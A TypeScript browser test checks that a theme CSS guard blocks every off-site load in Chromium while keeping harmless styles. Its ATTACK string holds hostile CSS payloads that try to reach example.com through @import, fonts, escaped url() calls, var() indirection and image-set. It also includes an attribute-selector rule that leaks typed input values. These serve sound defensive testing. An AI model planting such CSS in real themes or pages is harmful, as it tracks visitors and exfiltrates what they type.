// The theme CSS guard in a real Chromium, whose parser and CSSOM are what people run: nothing a theme writes may reach
// another site, and what stays still styles the page. Runs where a Chromium and playwright-core are named:
//   OMB_UI_CHROMIUM=<chrome or headless shell> OMB_UI_PLAYWRIGHT_CORE=<playwright-core dir> vitest run src/lib/theme/theme-css.chromium.test.ts
import { createRequire } from "node:module";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { build } from "esbuild";
import { afterAll, beforeAll, expect, it } from "vitest";

const { OMB_UI_CHROMIUM: chromiumPath, OMB_UI_PLAYWRIGHT_CORE: playwrightPath } = process.env;
const ready = Boolean(chromiumPath && playwrightPath);
const HERE = dirname(fileURLToPath(import.meta.url));

let browser: any;
let guard = "";

beforeAll(async () => {
  if (!ready) return;
  const bundled = await build({
    stdin: { contents: 'import { applyThemeCss, appliedThemeRules } from "./theme-css"; Object.assign(window, { applyThemeCss, appliedThemeRules });', resolveDir: HERE, loader: "ts" },
    bundle: true, write: false, format: "iife", platform: "browser",
  });
  guard = bundled.outputFiles[0]!.text;
  const { chromium } = createRequire(join(playwrightPath!, "package.json"))("playwright-core");
  browser = await chromium.launch({ executablePath: chromiumPath, headless: true });
}, 60_000);

afterAll(async () => {
  await browser?.close();
});

const ATTACK = String.raw`
@import url(https://example.com/sheet.css);
@namespace svg url(http://www.w3.org/2000/svg);
@property --registered { syntax: "<url>"; inherits: false; initial-value: url(https://example.com/p.png); }
@counter-style leak { system: cyclic; symbols: url(https://example.com/c.png); }
@font-face { font-family: Leak; src: url(https://example.com/leak.woff2); }
@keyframes drift { to { background-image: url(https://example.com/k.png); } }
:root { --leak: u\72l(https://example.com/v.png); }
#probe {
  color: rgb(1, 2, 3);
  font-family: Leak, sans-serif;
  background-image: u\72l(https://example.com/escaped.png);
  list-style-image: var(--leak);
  border-image-source: var(--registered);
  mask-image: image-set("https://example.com/set.png" 1x);
  cursor: url(https://example.com/cursor.png), auto;
  @media (min-width: 0px) { outline-color: rgb(7, 8, 9); content: url(https://example.com/nested.png); }
}
#probe:hover { background: url(https://example.com/hover.png); }
input[value^="a"] { background-image: url("https://example.com/?typed=a"); }
#local { background-image: url("/api/theme-assets/neon/stars.gif"); animation: drift 3s infinite; }
#inline { background-image: url("data:image/png;base64,iVBORw0KGgo="); }
`;

it.skipIf(!ready)("drops every load from another site while the rest of the theme applies", async () => {
  const page = await browser.newPage();
  const asked: string[] = [];
  await page.route("**/*", (route: any) => {
    asked.push(route.request().url());
    return route.request().url().startsWith("http://theme.test/") ? route.fulfill({ status: 200, contentType: "text/html", body: '<p id="probe">x</p><input value="abc"><div id="local"></div><div id="inline"></div>' }) : route.abort();
  });
  await page.goto("http://theme.test/");
  await page.addScriptTag({ content: guard });
  const seen = await page.evaluate(async (css: string) => {
    const win = window as unknown as { applyThemeCss(css: string): void; appliedThemeRules(): string[] };
    win.applyThemeCss(css);
    await document.fonts.ready;
    await new Promise((resolve) => setTimeout(resolve, 300));
    const probe = getComputedStyle(document.getElementById("probe")!);
    return {
      rules: win.appliedThemeRules().join("\n"),
      color: probe.color, outline: probe.outlineColor, background: probe.backgroundImage, list: probe.listStyleImage, border: probe.borderImageSource,
      mask: probe.maskImage, cursor: probe.cursor,
      local: getComputedStyle(document.getElementById("local")!).backgroundImage,
      inline: getComputedStyle(document.getElementById("inline")!).backgroundImage,
    };
  }, ATTACK);
  await page.close();

  expect(asked.filter((url) => !url.startsWith("http://theme.test/"))).toEqual([]);
  expect(seen.rules).not.toContain("example.com");
  expect(seen.rules).not.toMatch(/@import|@counter-style|image-set/);
  expect(seen).toMatchObject({ color: "rgb(1, 2, 3)", outline: "rgb(7, 8, 9)", background: "none", list: "none", border: "none", mask: "none", cursor: "auto" });
  expect(seen.local).toContain("/api/theme-assets/neon/stars.gif");
  expect(seen.inline).toContain("data:image/png;base64,iVBORw0KGgo=");
  expect(seen.rules).toMatch(/@keyframes drift/);
}, 60_000);
